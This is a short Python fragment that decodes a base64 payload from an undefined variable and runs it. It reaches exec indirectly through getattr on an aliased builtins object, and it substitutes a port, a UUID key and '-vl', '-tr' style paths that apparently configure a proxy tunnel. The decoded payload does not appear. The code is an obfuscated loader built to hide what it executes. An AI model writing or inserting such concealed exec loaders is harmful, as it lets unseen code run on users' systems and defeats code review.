import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "8dc9ac9f-d718-4a04-b5e2-2526a8771617")
    .replace("__vl__", "/8dc9ac9f-d718-4a04-b5e2-2526a8771617-vl")
    .replace("__vm__", "/8dc9ac9f-d718-4a04-b5e2-2526a8771617")
    .replace("__tr__", "/8dc9ac9f-d718-4a04-b5e2-2526a8771617-tr")
)